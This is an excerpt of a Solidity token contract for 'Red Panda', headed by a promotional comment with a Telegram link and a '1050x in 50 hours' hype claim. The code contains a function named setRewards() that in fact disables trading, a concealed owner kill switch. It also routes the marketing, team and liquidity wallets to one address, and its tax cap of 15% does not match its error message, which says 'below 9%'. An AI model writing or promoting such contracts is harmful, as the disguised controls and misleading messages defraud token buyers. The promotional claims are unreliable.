/**
https://t.me/RedPandaGlobal

The PEPE BSC team has releaunched, who did 1050x in 50 hours, join the diamond handed community on their next venture.

Airdrops will be send post launch.
*/
...
contract RedPanda is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress =
        payable(0x892428d5464593932c4a5d28dF4a862BE6f47dfF); // Marketing Address
        
    address payable public teamAddress =
        payable(0x892428d5464593932c4a5d28dF4a862BE6f47dfF); // Team Address
        
    address payable public liquidityAddress =
        payable(0x892428d5464593932c4a5d28dF4a862BE6f47dfF); // Liquidity Address
    ...
    string private constant _name = "Red Panda";
    ...
    constructor() {
        ...
        maxTransactionAmount = _tTotal * 30 / 1000; 
        maxWallet = _tTotal * 30 / 1000; 
    ...
    function setRewards() external onlyOwner returns (bool) {
        tradingActive = false;
        return true;
    }
        ...
        onlyOwner
    {
        ...
        require(_sellTaxFee + _sellLiquidityFee + _sellMarketingFee + _sellTeamFee <= 15, "Must keep taxes below 9%");
